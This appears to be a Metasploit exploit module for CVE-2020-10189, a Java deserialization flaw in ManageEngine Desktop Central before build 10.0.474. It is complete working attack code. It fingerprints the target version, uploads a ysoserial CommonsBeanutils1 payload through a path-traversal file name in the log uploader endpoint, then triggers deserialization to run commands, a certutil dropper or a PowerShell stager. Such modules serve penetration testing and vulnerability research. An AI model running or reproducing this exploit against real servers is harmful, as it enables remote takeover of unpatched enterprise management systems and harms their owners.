# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;             => &#039;ManageEngine Desktop Central Java Deserialization&#039;,
      &#039;Description&#039;      => %q{
        This module exploits a Java deserialization vulnerability in the
        getChartImage() method from the FileStorage class within ManageEngine
        Desktop Central versions < 10.0.474. Tested against 10.0.465 x64.

        "The short-term fix for the arbitrary file upload vulnerability was
        released in build 10.0.474 on January 20, 2020. In continuation of that,
        the complete fix for the remote code execution vulnerability is now
        available in build 10.0.479."
      },
      &#039;Author&#039;           => [
        &#039;mr_me&#039;, # Discovery and exploit
        &#039;wvu&#039;    # Module
      ],
      &#039;References&#039;       => [
        [&#039;CVE&#039;, &#039;2020-10189&#039;],
        [&#039;URL&#039;, &#039;https://srcincite.io/advisories/src-2020-0011/&#039;],
        [&#039;URL&#039;, &#039;https://srcincite.io/pocs/src-2020-0011.py.txt&#039;],
        [&#039;URL&#039;, &#039;https://twitter.com/steventseeley/status/1235635108498948096&#039;],
        [&#039;URL&#039;, &#039;https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html&#039;]
      ],
      &#039;DisclosureDate&#039;   => &#039;2020-03-05&#039;, # 0day release
      &#039;License&#039;          => MSF_LICENSE,
      &#039;Platform&#039;         => &#039;windows&#039;,
      &#039;Arch&#039;             => [ARCH_CMD, ARCH_X86, ARCH_X64],
      &#039;Privileged&#039;       => true,
      &#039;Targets&#039;          => [
        [&#039;Windows Command&#039;,
          &#039;Arch&#039;         => ARCH_CMD,
          &#039;Type&#039;         => :win_cmd
        ],
        [&#039;Windows Dropper&#039;,
          &#039;Arch&#039;         => [ARCH_X86, ARCH_X64],
          &#039;Type&#039;         => :win_dropper
        ],
        [&#039;PowerShell Stager&#039;,
          &#039;Arch&#039;         => [ARCH_X86, ARCH_X64],
          &#039;Type&#039;         => :psh_stager
        ]
      ],
      &#039;DefaultTarget&#039;    => 2,
      &#039;DefaultOptions&#039;   => {
        &#039;RPORT&#039;          => 8383,
        &#039;SSL&#039;            => true,
        &#039;WfsDelay&#039;       => 60 # It can take a little while to trigger
      },
      &#039;CmdStagerFlavor&#039;  => &#039;certutil&#039;, # This works without issue
      &#039;Notes&#039;            => {
        &#039;PatchedVersion&#039; => Gem::Version.new(&#039;100474&#039;),
        &#039;Stability&#039;      => [SERVICE_RESOURCE_LOSS], # May 404 the upload page?
        &#039;Reliability&#039;    => [FIRST_ATTEMPT_FAIL],    # Payload upload may fail
        &#039;SideEffects&#039;    => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;])
    ])
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;configurations.do&#039;)
    )

    unless res
      return CheckCode::Unknown(&#039;Target is not responding to check&#039;)
    end

    unless res.code == 200 && res.body.include?(&#039;ManageEngine Desktop Central&#039;)
      return CheckCode::Unknown(&#039;Target is not running Desktop Central&#039;)
    end

    version = res.get_html_document.at(&#039;//input[@id = "buildNum"]/@value&#039;)&.text

    unless version
      return CheckCode::Detected(&#039;Could not detect Desktop Central version&#039;)
    end

    vprint_status("Detected Desktop Central version #{version}")

    if Gem::Version.new(version) < notes[&#039;PatchedVersion&#039;]
      return CheckCode::Appears("#{version} is an exploitable version")
    end

    CheckCode::Safe("#{version} is not an exploitable version")
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    print_status("Executing #{target.name} for #{datastore[&#039;PAYLOAD&#039;]}")

    case target[&#039;Type&#039;]
    when :win_cmd
      execute_command(payload.encoded)
    when :win_dropper
      execute_cmdstager
    when :psh_stager
      execute_command(cmd_psh_payload(
        payload.encoded,
        payload.arch.first,
        remove_comspec: true
      ))
    end
  end

  def execute_command(cmd, _opts = {})
    # XXX: An executable is required to run arbitrary commands

    vprint_status("Serializing command: #{cmd}")

    # I identified mr_me&#039;s binary blob as the CommonsBeanutils1 payload :)
    serialized_payload = Msf::Util::JavaDeserialization.ysoserial_payload(
      &#039;CommonsBeanutils1&#039;,
      cmd
    )

    # XXX: Patch in expected serialVersionUID
    serialized_payload[140, 8] = "\xcf\x8e\x01\x82\xfe\x4e\xf1\x7e"

    # Rock &#039;n&#039; roll!
    upload_serialized_payload(serialized_payload)
    deserialize_payload
  end

  def upload_serialized_payload(serialized_payload)
    print_status(&#039;Uploading serialized payload&#039;)

    res = send_request_cgi(
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => normalize_uri(target_uri.path,
                                    &#039;/mdm/client/v1/mdmLogUploader&#039;),
      &#039;ctype&#039;      => &#039;application/octet-stream&#039;,
      &#039;vars_get&#039;   => {
        &#039;udid&#039;     => &#039;si\\..\\..\\..\\webapps\\DesktopCentral\\_chart&#039;,
        &#039;filename&#039; => &#039;logger.zip&#039;
      },
      &#039;data&#039;       => serialized_payload
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;Could not upload serialized payload&#039;)
    end

    print_good(&#039;Successfully uploaded serialized payload&#039;)

    # C:\Program Files\DesktopCentral_Server\bin
    register_file_for_cleanup(&#039;..\\webapps\\DesktopCentral\\_chart\\logger.zip&#039;)
  end

  def deserialize_payload
    print_status(&#039;Deserializing payload&#039;)

    res = send_request_cgi(
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;cewolf/&#039;),
      &#039;vars_get&#039; => {&#039;img&#039; => &#039;\\logger.zip&#039;}
    )

    unless res && res.code == 200
      fail_with(Failure::UnexpectedReply, &#039;Could not deserialize payload&#039;)
    end

    print_good(&#039;Successfully deserialized payload&#039;)
  end

end

